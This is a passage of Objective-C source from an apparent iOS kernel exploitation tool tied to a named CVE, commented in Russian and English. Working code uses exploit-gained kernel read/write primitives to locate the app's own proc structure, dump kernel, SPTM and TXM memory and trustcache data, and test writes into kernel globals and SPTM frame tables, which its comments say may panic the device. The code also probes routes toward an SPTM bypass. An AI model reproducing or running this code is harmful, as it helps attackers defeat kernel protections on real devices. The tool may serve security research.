    kpNote(r, [NSString stringWithFormat:@"  zone(inpcb): raw=0x%016llx → 0x%016llx", (unsigned long long)raw, (unsigned long long)zoneInpcb]);
    if (!kpLooksLikeKernelPointer(zoneInpcb)) return 0;

    // Calibrate z_name offset in struct zone: find the qword whose pointee
    // reads "inpcb".
    uint32_t zNameOff = 0;
    BOOL calibrated = NO;
    {
        uint8_t zw[0x400];
        memset(zw, 0, sizeof(zw));
        if (!kpRead(zoneInpcb, zw, sizeof(zw), "zone struct", r)) return 0;
        for (uint32_t off = 0; off + 8 <= sizeof(zw); off += 8) {
            uint64_t q = 0;
            memcpy(&q, zw + off, 8);
            uint64_t cand = kp_untag_ptr(q);
            if (!kpLooksLikeKernelPointer(cand)) continue;
            uint8_t strBuf[32];
            memset(strBuf, 0, sizeof(strBuf));
            if (!kpRead(cand, strBuf, sizeof(strBuf), "z_name candidate", r)) continue;
            if (memcmp(strBuf, "inpcb", 6) == 0) {
                zNameOff = off;
                calibrated = YES;
                kpNote(r, [NSString stringWithFormat:@"  z_name offset в struct zone: +0x%x (строка @ %#llx)", off, (unsigned long long)cand]);
                break;
            }
        }
    }
    if (!calibrated) {
        kpNote(r, @"  z_name offset не откалиброван — выход");
        return 0;
    }

    // Scan ±64 pages around the inpcb zone struct for a zone named "proc".
    uint64_t procZone = 0;
    uint64_t scanBase = zoneInpcb & ~0x3FFFULL;
    NSMutableString *zoneNames = [NSMutableString string];
    for (int64_t pg = -64; pg <= 64 && !procZone; pg++) {
        uint64_t pageVA = scanBase + pg * 0x4000;
        for (uint64_t off = 0; off < 0x4000 && !procZone; off += 0x400) {
            uint8_t win[0x400];
            memset(win, 0, sizeof(win));
            if (!kpRead(pageVA + off, win, sizeof(win), "zone page", r)) break;
            for (uint32_t q = 0; q + 8 <= sizeof(win); q += 8) {
                uint64_t qv = 0;
                memcpy(&qv, win + q, 8);
                uint64_t cand = kp_untag_ptr(qv);
                if (!kpLooksLikeKernelPointer(cand)) continue;
                // zone names live in the kernel __TEXT cstring region
                if (cand < kconstant(base) || cand >= kconstant(base) + 0x1000000) continue;
                uint8_t strBuf[32];
                memset(strBuf, 0, sizeof(strBuf));
                if (!kpRead(cand, strBuf, sizeof(strBuf), "zone name", r)) continue;
                if (strBuf[0] < 0x20 || strBuf[0] > 0x7e) continue;
                BOOL printable = YES;
                int len = 0;
                for (int c = 0; c < 31; c++) {
                    if (strBuf[c] == 0) { len = c; break; }
                    if (strBuf[c] < 0x20 || strBuf[c] > 0x7e) { printable = NO; break; }
                }
                if (!printable || len < 3) continue;
                [zoneNames appendFormat:@"%s@q%#llx ", (char *)strBuf, (unsigned long long)(pageVA + off + q)];
                if (memcmp(strBuf, "proc", 5) == 0) {
                    procZone = pageVA + off + q - zNameOff;
                    break;
                }
            }
        }
    }
    if (zoneNames.length) kpNote(r, [NSString stringWithFormat:@"  зоны рядом: %@", zoneNames]);
    if (!procZone) {
        kpNote(r, @"  зона «proc» не найдена в ±64 страницах — выход");
        return 0;
    }
    kpNote(r, [NSString stringWithFormat:@"  зона «proc» @ %#llx", (unsigned long long)procZone]);

    // Find the page-queue head field by content: a queue head {next,prev}
    // where next strips to a kernel VA and *(next+8) strips back to &field.
    uint32_t pageqOff = 0;
    {
        uint8_t zw[0x400];
        memset(zw, 0, sizeof(zw));
        if (!kpRead(procZone, zw, sizeof(zw), "proc zone struct", r)) return 0;
        for (uint32_t off = 0; off + 8 <= sizeof(zw); off += 8) {
            uint64_t q = 0;
            memcpy(&q, zw + off, 8);
            uint64_t next = kp_untag_ptr(q);
            if (!kpLooksLikeKernelPointer(next)) continue;
            uint64_t backRaw = 0;
            if (!kpRead(next + 8, &backRaw, sizeof(backRaw), "queue back-ptr", r)) continue;
            if (kp_untag_ptr(backRaw) == procZone + off) {
                pageqOff = off;
                kpNote(r, [NSString stringWithFormat:@"  z_pageq offset в proc-зоне: +0x%x (next=%#llx)", off, (unsigned long long)next]);
                break;
            }
        }
    }
    if (!pageqOff) {
        kpNote(r, @"  page-queue голова не найдена — выход");
        return 0;
    }

    // Walk zone pages; scan each for our comm; validate via ucred hop.
    const char *myName = getprogname();
    size_t myLen = strlen(myName) + 1;
    uint64_t zpage = 0;
    {
        uint64_t q = 0;
        if (!kpRead(procZone + pageqOff, &q, sizeof(q), "z_pageq first", r)) return 0;
        zpage = kp_untag_ptr(q);
    }
    uint64_t procVA = 0;
    for (int zp = 0; zp < 512 && kpLooksLikeKernelPointer(zpage) && !procVA; zp++) {
        uint64_t pageBase = zpage & ~0x3FFFULL;
        for (uint64_t off = 0; off < 0x4000 && !procVA; off += 0x400) {
            uint8_t win[0x400];
            memset(win, 0, sizeof(win));
            if (!kpRead(pageBase + off, win, sizeof(win), "proc page", r)) break;
            for (uint32_t q = 0; q + myLen <= sizeof(win); q++) {
                if (memcmp(win + q, myName, myLen) != 0) continue;
                // hit: find the containing element (stride 0x740 from pageBase)
                uint64_t hitVA = pageBase + off + q;
                for (uint64_t elem = pageBase; elem + 0x740 <= pageBase + 0x4000; elem += 0x740) {
                    if (hitVA < elem || hitVA >= elem + 0x740) continue;
                    // validate candidate: proc → proc_ro(+0x18) → ucred(+0x28) → uid(+0x18) == getuid()
                    uint64_t roRaw = 0, credRaw = 0;
                    if (!kpRead(elem + koffsetof(proc, proc_ro), &roRaw, sizeof(roRaw), "cand proc_ro", r)) break;
                    uint64_t ro = kp_untag_ptr(roRaw);
                    if (!kpLooksLikeKernelPointer(ro)) break;
                    if (!kpRead(ro + koffsetof(proc_ro, ucred), &credRaw, sizeof(credRaw), "cand ucred", r)) break;
                    uint64_t cred = kp_untag_ptr(credRaw);
                    if (!kpLooksLikeKernelPointer(cred)) break;
                    uint32_t uid = 0;
                    if (!kpRead(cred + 0x18, &uid, sizeof(uid), "cand cr_uid", r)) break;
                    kpNote(r, [NSString stringWithFormat:@"  кандидат proc %#llx (hit @ %#llx): uid=%u (ждём uid=%d)",
                              (unsigned long long)elem, (unsigned long long)hitVA, uid, getuid()]);
                    if (uid == (uint32_t)getuid()) {
                        procVA = elem;
                        gCommOff = (uint32_t)(hitVA - elem);
                        kpNote(r, [NSString stringWithFormat:@"  НАШ proc @ %#llx (ucred-hop подтверждён; p_comm=+0x%x)",
                                  (unsigned long long)procVA, gCommOff]);
                        break;
                    }
                }
                if (procVA) break;
            }
        }
        // next zpage
        uint64_t q = 0;
        if (!kpRead(zpage, &q, sizeof(q), "zpage next", r)) break;
        uint64_t next = kp_untag_ptr(q);
        if (next == kp_untag_ptr(zpage) || !next) break;
        zpage = next;
        if ((zp & 0x1F) == 0x1F) kpNote(r, [NSString stringWithFormat:@"  …обошли %d страниц proc-зоны", zp + 1]);
    }
    if (!procVA) {
        kpNote(r, @"  наш proc не найден в proc-зоне — выход");
    }
    return procVA;
}

static void kpDumpProc(NSMutableString *report, const char *label, uint64_t proc, uint32_t commOff)
{
    if (!kpLooksLikeKernelPointer(proc)) {
        kpNote(report, [NSString stringWithFormat:@"  %s: некорректный указатель proc %#llx — пропуск", label, proc]);
        return;
    }

    uint8_t window[0x400];
    if (!kpRead(proc, window, sizeof(window), label, report)) return;

    uint32_t pidOff = gPidOff ? gPidOff : koffsetof(proc, pid);
    uint32_t pid = 0;
    memcpy(&pid, window + pidOff, sizeof(pid));

    char comm[33] = {0};
    if (commOff && commOff + 32 <= sizeof(window)) {
        memcpy(comm, window + commOff, 32);
    }

    kpNote(report, [NSString stringWithFormat:@"  %s proc=%#llx pid=%u comm=\"%s\"", label, proc, pid, comm]);
}

+ (NSString *)buildReport
{
    KPLog *log = [KPLog shared];
    NSMutableString *r = [NSMutableString string];

    struct utsname u;
    uname(&u);
    NSISO8601DateFormatter *iso = [[NSISO8601DateFormatter alloc] init];

    // 1.5.9: incremental dump. The report file is appended after every section
    // and fsync'd, so a kernel panic mid-dump keeps everything gathered so far
    // (previously the report existed only as one write at the very end).
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    NSString *dumpPath = [docs stringByAppendingPathComponent:@"kexproof-dump.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:dumpPath error:nil];
    [[NSFileManager defaultManager] createFileAtPath:dumpPath contents:nil attributes:nil];
    NSFileHandle *dumpFH = [NSFileHandle fileHandleForWritingAtPath:dumpPath];
    __block NSUInteger flushedUpTo = 0;
    void (^flush)(void) = ^{
        if (!dumpFH || r.length <= flushedUpTo) return;
        @try {
            NSString *delta = [r substringFromIndex:flushedUpTo];
            flushedUpTo = r.length;
            [dumpFH seekToEndOfFile];
            [dumpFH writeData:[delta dataUsingEncoding:NSUTF8StringEncoding]];
            [dumpFH synchronizeFile];
        } @catch (NSException *ignored) {}
    };

    void (^section)(NSString *) = ^(NSString *title) {
        flush();  // everything gathered since the previous section hits disk now
        kpNote(r, [NSString stringWithFormat:@"\n--- %@ ---", title]);
    };
    void (^kv)(NSString *, NSString *) = ^(NSString *key, NSString *val) {
        kpNote(r, [NSString stringWithFormat:@"  %-32@ %@", key, val]);
    };

    [r appendString:@"========================================\n"];
    [r appendString:@"KexProof — дамп ядра (CVE-2025-43520, ClearSword)\n"];
    [r appendFormat:@"Дата: %@\nУстройство: %s · iOS %@ · Darwin %s · %s\n",
        [iso stringFromDate:[NSDate date]], u.machine,
        [UIDevice currentDevice].systemVersion, u.release, u.version];
    [r appendString:@"========================================\n"];

    // Self-test: read the kernel header magic and cpu_ttep through the raw
    // primitive, so a broken read path is visible before anything else.
    if (kconstant(base)) {
        uint64_t magic = 0;
        kreadbuf(kconstant(base), &magic, sizeof(magic));
        kpNote(r, [NSString stringWithFormat:@"самотест чтения: u64 @ kernel base = 0x%016llx (ждём 0x0100000cfeedfacf)", magic]);
        if (ksymbol(cpu_ttep)) {
            uint64_t ttep = 0;
            kreadbuf(ksymbol(cpu_ttep), &ttep, sizeof(ttep));
            kpNote(r, [NSString stringWithFormat:@"самотест: cpu_ttep u64 = 0x%016llx (@ 0x%016llx)", ttep, ksymbol(cpu_ttep)]);
        }
        // For each target: u64 via the stock path vs the aligned-window path,
        // plus the raw stock 32-byte window for context.
        uint64_t targets[3] = {kconstant(base), 0, 0};
        if (ksymbol(cpu_ttep)) targets[1] = ksymbol(cpu_ttep);
        if (ksymbol(mach_kobj_count)) targets[2] = ksymbol(mach_kobj_count);
        for (int t = 0; t < 3; ++t) {
            if (!targets[t]) continue;
            uint64_t stockValue = 0;
            kreadbuf(targets[t], &stockValue, sizeof(stockValue));
            uint64_t alignedValue = 0;
            early_kreadbuf_aligned(targets[t], &alignedValue, sizeof(alignedValue));
            uint8_t window[32];
            memset(window, 0, sizeof(window));
            kreadbuf(targets[t], window, sizeof(window));
            NSMutableString *hex = [NSMutableString string];
            for (int i = 0; i < 32; i += 8) {
                uint64_t q = 0;
                memcpy(&q, window + i, 8);
                [hex appendFormat:@"%016llx ", (unsigned long long)q];
            }
            kpNote(r, [NSString stringWithFormat:@"@ 0x%016llx u64 stock=0x%016llx aligned=0x%016llx",
                      targets[t],
                      (unsigned long long)stockValue,
                      (unsigned long long)alignedValue]);
            kpNote(r, [NSString stringWithFormat:@"  окно (stock): %@", hex]);
        }
    }

    section(@"Константы ядра");
    kv(@"kernel base (static)", [NSString stringWithFormat:@"0x%016llx", kconstant(staticBase)]);
    kv(@"kernel base (runtime)", [NSString stringWithFormat:@"0x%016llx", kconstant(base)]);
    kv(@"kernel slide", [NSString stringWithFormat:@"0x%016llx", kconstant(slide)]);
    kv(@"kernel_el", [NSString stringWithFormat:@"%llu", kconstant(kernel_el)]);
    kv(@"pointer_mask", [NSString stringWithFormat:@"0x%016llx", kconstant(pointer_mask)]);
    kv(@"gVirtBase", [NSString stringWithFormat:@"0x%016llx", kconstant(virtBase)]);
    kv(@"gPhysBase", [NSString stringWithFormat:@"0x%016llx", kconstant(physBase)]);
    kv(@"gPhysSize", [NSString stringWithFormat:@"0x%016llx", kconstant(physSize)]);
    kv(@"cpu_ttep", [NSString stringWithFormat:@"0x%016llx", kconstant(cpuTTEP)]);
    kv(@"vm real page size", [NSString stringWithFormat:@"0x%llx", vm_real_kernel_page_size]);
    if (kconstant(sptmBase)) {
        kv(@"sptm base", [NSString stringWithFormat:@"0x%016llx", kconstant(sptmBase)]);
        kv(@"sptm slide", [NSString stringWithFormat:@"0x%016llx", kconstant(sptmSlide)]);
    }
    if (kconstant(txmBase)) {
        kv(@"txm base", [NSString stringWithFormat:@"0x%016llx", kconstant(txmBase)]);
        kv(@"txm slide", [NSString stringWithFormat:@"0x%016llx", kconstant(txmSlide)]);
    }

    section(@"Магия заголовка ядра (первые 64 байта по kernel base)");
    if (kconstant(base)) {
        uint8_t header[64];
        if (kpRead(kconstant(base), header, sizeof(header), "kernel base", r)) {
            NSMutableString *hex = [NSMutableString string];
            kpAppendHexDump(hex, kconstant(base), header, sizeof(header));
            [log append:hex];
            [r appendString:hex];
            uint64_t magic = 0;
            memcpy(&magic, header, sizeof(magic));
            kv(@"magic check", (magic == 0x0100000CFEEDFACFULL) ? @"OK (feedfacf, MH_MAGIC_64)" : @"НЕ СОВПАЛА");
        }
    }
    else {
        kpNote(r, @"  kernel base неизвестен — пропуск");
    }

    section(@"Глобальные переменные VM (адрес символа и значение)");
    struct { const char *name; uint64_t symAddr; } vmSyms[] = {
        { "gPhysBase",     ksymbol(gPhysBase) },
        { "gVirtBase",     ksymbol(gVirtBase) },
        { "cpu_ttep",      ksymbol(cpu_ttep) },
        { "vm_first_phys", ksymbol(vm_first_phys) },
        { "vm_last_phys",  ksymbol(vm_last_phys) },
        { "pv_head_table", ksymbol(pv_head_table) },
    };
    for (size_t i = 0; i < sizeof(vmSyms) / sizeof(vmSyms[0]); i++) {
        if (!vmSyms[i].symAddr) {
            kpNote(r, [NSString stringWithFormat:@"  %-32s ключ не найден — пропуск", vmSyms[i].name]);
            continue;
        }
        kpNote(r, [NSString stringWithFormat:@"  %s символ @ 0x%016llx", vmSyms[i].name, vmSyms[i].symAddr]);
        uint64_t v = 0;
        kpReadU64(vmSyms[i].name, vmSyms[i].symAddr, &v, r);
    }

    section(@"SPTMArgs (128 байт у символа, затем по указателю)");
    if (ksymbol(SPTMArgs)) {
        uint8_t buf[128];
        if (kpRead(ksymbol(SPTMArgs), buf, sizeof(buf), "SPTMArgs", r)) {
            NSMutableString *hex = [NSMutableString string];
            kpAppendHexDump(hex, ksymbol(SPTMArgs), buf, sizeof(buf));
            [log append:hex];
            [r appendString:hex];

            uint64_t args = 0;
            memcpy(&args, buf, sizeof(args));
            args = kp_untag_ptr(args);
            kv(@"SPTMArgs ptr", [NSString stringWithFormat:@"0x%016llx", args]);
            if (kpLooksLikeKernelPointer(args)) {
                kpDumpRegion(r, "SPTMArgs target", args, 128);
            }
            else {
                kpNote(r, @"  SPTMArgs target: некорректный указатель — пропуск");
            }
        }
    }
    else {
        kpNote(r, @"  SPTMArgs: ключ не найден — пропуск");
    }

    section(@"libsptm_frame_type_params (256 байт)");
    kpDumpRegion(r, "libsptm_frame_type_params", ksymbol(libsptm_frame_type_params), 256);

    section(@"libsptm_frame_table (первые 256 байт)");
    kpDumpRegion(r, "libsptm_frame_table", ksymbol(libsptm_frame_table), 256);

    section(@"n_papt_ranges_compressed (sptm-слайд)");
    if (ksymbol_sptm(n_papt_ranges_compressed)) {
        kpNote(r, [NSString stringWithFormat:@"  n_papt_ranges_compressed символ @ 0x%016llx", ksymbol_sptm(n_papt_ranges_compressed)]);
        uint8_t buf[64];
        if (kpRead(ksymbol_sptm(n_papt_ranges_compressed), buf, sizeof(buf), "n_papt_ranges_compressed", r)) {
            uint32_t n = 0;
            memcpy(&n, buf, sizeof(n));
            kv(@"n_papt_ranges_compressed", [NSString stringWithFormat:@"%u (0x%x)", n, n]);
            NSMutableString *hex = [NSMutableString string];
            kpAppendHexDump(hex, ksymbol_sptm(n_papt_ranges_compressed), buf, sizeof(buf));
            [log append:hex];
            [r appendString:hex];
        }
    }
    else {
        kpNote(r, @"  n_papt_ranges_compressed: ключ не найден (нет SPTM-слайда?) — пропуск");
    }

    section(@"libsptm_papt_ranges (128 байт) + таблица по указателю");
    if (ksymbol(libsptm_papt_ranges)) {
        uint8_t buf[128];
        if (kpRead(ksymbol(libsptm_papt_ranges), buf, sizeof(buf), "libsptm_papt_ranges", r)) {
            NSMutableString *hex = [NSMutableString string];
            kpAppendHexDump(hex, ksymbol(libsptm_papt_ranges), buf, sizeof(buf));
            [log append:hex];
            [r appendString:hex];

            uint64_t table = 0;
            memcpy(&table, buf, sizeof(table));
            table = kp_untag_ptr(table);
            kv(@"libsptm_papt_ranges ptr", [NSString stringWithFormat:@"0x%016llx", table]);
            if (kpLooksLikeKernelPointer(table)) {
                kpDumpRegion(r, "papt table", table, 128);
            }
            else {
                kpNote(r, @"  papt table: некорректный указатель — пропуск");
            }
        }
    }
    else {
        kpNote(r, @"  libsptm_papt_ranges: ключ не найден — пропуск");
    }

    section(@"papt_ranges_compressed (sptm-слайд, 128 байт)");
    kpDumpRegion(r, "papt_ranges_compressed", ksymbol_sptm(papt_ranges_compressed), 128);

    section(@"txm_trustcache_root (txm-слайд, 64 байта + по указателям)");
    if (ksymbol_txm(txm_trustcache_root)) {
        uint8_t buf[64];
        if (kpRead(ksymbol_txm(txm_trustcache_root), buf, sizeof(buf), "txm_trustcache_root", r)) {
            NSMutableString *hex = [NSMutableString string];
            kpAppendHexDump(hex, ksymbol_txm(txm_trustcache_root), buf, sizeof(buf));
            [log append:hex];
            [r appendString:hex];

            uint64_t ptr0 = 0, rootTc = 0;
            memcpy(&ptr0, buf, sizeof(ptr0));
            memcpy(&rootTc, buf + 0x20, sizeof(rootTc));
            ptr0 = kp_untag_ptr(ptr0);
            rootTc = kp_untag_ptr(rootTc);

            kv(@"*(txm_trustcache_root)", [NSString stringWithFormat:@"0x%016llx", ptr0]);
            if (kpLooksLikeKernelPointer(ptr0)) {
                kpDumpRegion(r, "txm_trustcache_root ptr", ptr0, 64);
            }
            else {
                kpNote(r, @"  *txm_trustcache_root: некорректный указатель — пропуск");
            }

            // Dopamine's trustcache.c: active root trustcache lives at +0x20
            kv(@"*(txm_trustcache_root+0x20)", [NSString stringWithFormat:@"0x%016llx", rootTc]);
            if (kpLooksLikeKernelPointer(rootTc)) {
                kpDumpRegion(r, "root trustcache", rootTc, 64);
            }
            else {
                kpNote(r, @"  *(txm_trustcache_root+0x20): некорректный указатель — пропуск");
            }
        }
    }
    else {
        kpNote(r, @"  txm_trustcache_root: ключ не найден (нет TXM-слайда?) — пропуск");
    }

    section(@"allproc (EXP-01: две соседние головы, калибровка по kernel_task)");
    {
        uint64_t head = [self resolveAllprocHeadWithLog:r];
        if (!head) {
            kpNote(r, @"  allproc недоступен — см. диагностику выше");
        }
        else {
            // Walk and print the first four procs of the fixed chain.
            uint64_t node = head, prev = 0;
            for (int i = 0; i < 4 && kpLooksLikeKernelPointer(node) && node != prev; i++) {
                kpDumpProc(r, i == 0 ? "proc[0] (kernel_task)" : "proc[next]", node, gCommOff);
                uint64_t nextRaw = 0;
                if (!kpRead(node + koffsetof(proc, list_next), &nextRaw, sizeof(nextRaw), "p_list.le_next", r)) break;
                prev = node;
                node = kp_untag_ptr(nextRaw);
            }
        }
    }

    section(@"Конец дампа");
    flush();
    return r;
}

+ (NSString *)sptmWriteTestReport
{
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n--- Эксперимент A0: безопасное доказательство kwrite ---\n"];
    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
        [r appendString:@"KRW-примитивы не живы — сначала эксплойт.\n"];
        return r;
    }
    uint64_t kobjCount = ksymbol(mach_kobj_count);
    if (!kobjCount) {
        [r appendString:@"mach_kobj_count нет в словаре оффсетов — SKIP\n"];
        return r;
    }
    kpNote(r, [NSString stringWithFormat:@"mach_kobj_count @ 0x%llx", kobjCount]);

    // Same-value rewrite + readback: harmless on a live stats counter, and it
    // proves the write path end-to-end without touching anything SPTM-owned.
    uint64_t original = 0;
    kreadbuf(kobjCount, &original, sizeof(original));
    kpNote(r, [NSString stringWithFormat:@"прочитано до записи: 0x%llx",
              (unsigned long long)original]);

    uint64_t toggled = original ^ 0x1; // flip the lowest bit only
    kwritebuf(kobjCount, &toggled, sizeof(toggled));
    uint64_t afterWrite = 0;
    kreadbuf(kobjCount, &afterWrite, sizeof(afterWrite));
    kpNote(r, [NSString stringWithFormat:@"прочитано после записи: 0x%llx (ждём 0x%llx)",
              (unsigned long long)afterWrite, (unsigned long long)toggled]);

    // Restore the original value.
    kwritebuf(kobjCount, &original, sizeof(original));
    uint64_t restored = 0;
    kreadbuf(kobjCount, &restored, sizeof(restored));

    BOOL writeWorks = (afterWrite == toggled);
    if (writeWorks) {
        [r appendString:@"\n=== A0 PASS: kwrite пишет и читается обратно ===\n"];
        [r appendString:[NSString stringWithFormat:@"восстановление: %s (0x%llx)\n",
            restored == original ? "OK" : "СЧЁТЧИК ШАГНУЛ ПОКА ПИСАЛИ — это нормально",
            (unsigned long long)restored]];
        [r appendString:@"Запись работает. (A1) frame_table — отдельная кнопка, МОЖЕТ ПАНИКОВАТЬ (уже паниковала один раз — это и есть ответ, что EL1 туда не пишет без SPTM-байпаса).\n"];
    } else {
        [r appendString:@"\n=== A0 FAIL: записи не прилипли — kwrite не работает даже на обычной глобали ===\n"];
        [r appendString:@"Тогда и frame_table не напишется. Копаем путь записи (setsockopt ICMP6_FILTER).\n"];
    }
    return r;
}

+ (NSString *)sptmFrameTableWriteTestReport
{
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n--- Эксперимент A1: запись в страницу SPTM frame_table (МОЖЕТ ПАНИКОВАТЬ!) ---\n"];
    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
        [r appendString:@"KRW-примитивы не живы — сначала эксплойт.\n"];
        return r;
    }
    uint64_t table = ksymbol(libsptm_frame_table);
    if (!table) {
        [r appendString:@"libsptm_frame_table нет в словаре оффсетов — SKIP\n"];
        return r;
    }
    kpNote(r, [NSString stringWithFormat:@"frame_table @ 0x%llx", table]);

    // Scan the page for a zero qword (free entry); never touch live entries.
    // 1.8.0: reads go through kpRead — the EL2/unmapped gates apply here too;
    // a frame_table VA that is not backed must not panic the win.
    const size_t pageSize = 0x4000;
    uint64_t zeroSlot = 0;
    for (uint64_t off = 0; off < pageSize; off += 0x100) {
        uint8_t chunk[0x100];
        memset(chunk, 0, sizeof(chunk));
        if (!kpRead(table + off, chunk, sizeof(chunk), "frame_table scan", r)) return r;
        for (size_t i = 0; i + 8 <= sizeof(chunk); i += 8) {
            uint64_t value = 0;
            memcpy(&value, chunk + i, sizeof(value));
            if (value == 0) {
                zeroSlot = table + off + i;
                break;
            }
        }
        if (zeroSlot) break;
    }
    if (!zeroSlot) {
        [r appendString:@"Свободных (нулевых) записей на странице нет — SKIP (живые записи не трогаем)\n"];
        return r;
    }
    kpNote(r, [NSString stringWithFormat:@"свободный слот @ 0x%llx", zeroSlot]);

    static const uint64_t marker = 0x4b50575249544531ULL; // "KPWRITE1"
    kwritebuf(zeroSlot, &marker, sizeof(marker));
    uint64_t readback = 0;
    kpRead(zeroSlot, &readback, sizeof(readback), "A1 readback", r);
    BOOL stuck = (readback == marker);
    kpNote(r, [NSString stringWithFormat:@"записал 0x%llx, прочитал обратно 0x%llx",
              (unsigned long long)marker, (unsigned long long)readback]);

    // Always restore zeros, whatever happened above.
    uint64_t zero = 0;
    kwritebuf(zeroSlot, &zero, sizeof(zero));
    uint64_t verify = 0;
    kpRead(zeroSlot, &verify, sizeof(verify), "A1 restore-verify", r);

    if (stuck) {
        [r appendString:@"\n=== PASS: страница frame_table ПИШЕТСЯ из EL1 ===\n"];
        [r appendString:@"SPTM-состояние можно менять напрямую — типы/параметры фреймов на редактирование.\n"];
        [r appendString:@"Восстановление нулей: "];
        [r appendString:verify == 0 ? @"OK\n" : [NSString stringWithFormat:@"ПРОВАЛ (осталось 0x%llx)\n", (unsigned long long)verify]];
    } else {
        [r appendString:@"\n=== FAIL: запись не прилипла — страницы SPTM из EL1 не пишутся ===\n"];
        [r appendString:@"Следующие кандидаты: (B) валидация аргументов эндпоинтов, (C) гонка nest/unnest, (D) TXM-стек 0x2a.\n"];
    }
    return r;
}

#pragma mark - EXP-02: SPTM/TXM bases (DEBG fast path + pointer-vote)

// The libsptm kernel block (static 0x7b37748) holds tagged pointers to the
// shared runtime pages. Return all pointer-looking stripped values (cached).
static NSArray<NSNumber *> *gBlockPointees = nil;
+ (NSArray<NSNumber *> *)libsptmBlockPointeesWithLog:(NSMutableString *)r
{
    if (gBlockPointees) return gBlockPointees;
    NSMutableArray<NSNumber *> *out = [NSMutableArray array];
    if (!ksymbol(libsptm_n_papt_ranges)) return out;
    uint64_t blockBase = ksymbol(libsptm_n_papt_ranges) - 8; // static 0x7b37748
    uint8_t block[0xB0];
    memset(block, 0, sizeof(block));
    if (!kpRead(blockBase, block, sizeof(block), "libsptm block", r)) return out;
    [r appendString:@"  libsptm block pointees (stripped):\n"];
    for (int i = 0; i < 0xB0 / 8; i++) {
        uint64_t raw = 0;
        memcpy(&raw, block + i * 8, 8);
        uint64_t va = kp_untag_ptr(raw);
        if (kpLooksLikeKernelPointer(va)) {
            [out addObject:@(va)];
            [r appendFormat:@"    +0x%02x → 0x%016llx\n", i * 8, (unsigned long long)va];
        }
    }
    gBlockPointees = out;
    return out;
}

// Derive SPTM/TXM runtime slides by voting: scan the shared pages for qwords
// that strip into the SPTM/TXM image ranges, and for each compute candidate
// slides against known static offsets (validator funcs / TXM stubs from the
// interface map). The slide that explains the most pointers wins.
+ (BOOL)deriveSptmTxmSlidesByVote:(NSMutableString *)r
{
    if (!kconstant(staticSptmBase)) {
        kpNote(r, @"  vote: нет staticSptmBase — пропуск");
        return NO;
    }
    // Known static offsets inside the SPTM image (interface map §6.2: frame
    // type descriptor validators/hooks) and TXM image (§7: dispatcher, branch
    // table, svc stubs, trustcache root).
    static const uint64_t sptmKnown[] = {
        0xfffffff0270b9620ULL, 0xfffffff0270b9618ULL, 0xfffffff0270b8ba0ULL,
        0xfffffff0270b8f2cULL, 0xfffffff0270b8a4cULL, 0xfffffff0270b8b30ULL,
        0xfffffff0270b87a0ULL, 0xfffffff0270b86bcULL, 0xfffffff0270b8c70ULL,
        0xfffffff0270b8578ULL, 0xfffffff0270b9628ULL, 0xfffffff0270b9604ULL,
        0xfffffff0270b89e0ULL,
    };
    static const uint64_t txmKnown[] = {
        0xfffffff017026d34ULL, 0xfffffff01702718cULL,
        0xfffffff01706005cULL, 0xfffffff017060068ULL, 0xfffffff017010590ULL,
    };
    uint64_t sptmLo = kconstant(staticSptmBase), sptmHi = sptmLo + 0xF4000;
    uint64_t txmLo = kconstant(staticTxmBase), txmHi = txmLo + 0x64000;

    NSMutableDictionary<NSNumber *, NSNumber *> *sptmVotes = [NSMutableDictionary dictionary];
    NSMutableDictionary<NSNumber *, NSNumber *> *txmVotes = [NSMutableDictionary dictionary];

    NSArray<NSNumber *> *pointees = [self libsptmBlockPointeesWithLog:r];
    for (NSNumber *pv in pointees) {
        uint64_t pageVA = pv.unsignedLongLongValue;
        // scan the page in 0x400 windows
        for (uint64_t off = 0; off < 0x4000; off += 0x400) {
            uint8_t win[0x400];
            memset(win, 0, sizeof(win));
            if (!kpRead(pageVA + off, win, sizeof(win), "vote scan", r)) break;
            for (uint32_t q = 0; q + 8 <= sizeof(win); q += 8) {
                uint64_t raw = 0;
                memcpy(&raw, win + q, 8);
                uint64_t va = kp_untag_ptr(raw);
                if (va >= sptmLo && va < sptmHi) {
                    for (size_t k = 0; k < sizeof(sptmKnown) / sizeof(sptmKnown[0]); k++) {
                        int64_t cand = (int64_t)(va - sptmKnown[k]);
                        if ((cand & 0x3fff) == 0 && llabs(cand) < 0x40000000) {
                            NSNumber *key = @(cand);
                            sptmVotes[key] = @(sptmVotes[key].intValue + 1);
                        }
                    }
                }
                if (kconstant(staticTxmBase) && va >= txmLo && va < txmHi) {
                    for (size_t k = 0; k < sizeof(txmKnown) / sizeof(txmKnown[0]); k++) {
                        int64_t cand = (int64_t)(va - txmKnown[k]);
                        if ((cand & 0x3fff) == 0 && llabs(cand) < 0x40000000) {
                            NSNumber *key = @(cand);
                            txmVotes[key] = @(txmVotes[key].intValue + 1);
                        }
                    }
                }
            }
        }
    }

    BOOL okSptm = NO, okTxm = NO;
    if (sptmVotes.count) {
        NSArray<NSNumber *> *sorted = [sptmVotes.allKeys sortedArrayUsingComparator:^NSComparisonResult(NSNumber *a, NSNumber *b) {
            return [@(sptmVotes[b].intValue) compare:@(sptmVotes[a].intValue)];
        }];
        for (NSNumber *cand in sorted) {
            if ([cand isEqual:sorted.firstObject] || sptmVotes[cand].intValue >= 2) {
                kpNote(r, [NSString stringWithFormat:@"  vote SPTM: slide=%s0x%llx голосов=%d",
                          cand.longLongValue < 0 ? "-" : "", (unsigned long long)llabs(cand.longLongValue), sptmVotes[cand].intValue]);
            }
        }
        NSNumber *best = sorted.firstObject;
        if (sptmVotes[best].intValue >= 2) {
            int64_t slide = best.longLongValue;
            gSystemInfo.kernelConstant.sptmSlide = (uint64_t)slide;
            gSystemInfo.kernelConstant.sptmBase = kconstant(staticSptmBase) + slide;
            kpNote(r, [NSString stringWithFormat:@"  EXP-02: sptmSlide=%s0x%llx (голосов=%d), sptmBase=0x%016llx",
                      slide < 0 ? "-" : "", (unsigned long long)llabs(slide), sptmVotes[best].intValue,
                      (unsigned long long)kconstant(sptmBase)]);
            okSptm = YES;
        }
    }
    if (txmVotes.count) {
        NSArray<NSNumber *> *sorted = [txmVotes.allKeys sortedArrayUsingComparator:^NSComparisonResult(NSNumber *a, NSNumber *b) {
            return [@(txmVotes[b].intValue) compare:@(txmVotes[a].intValue)];
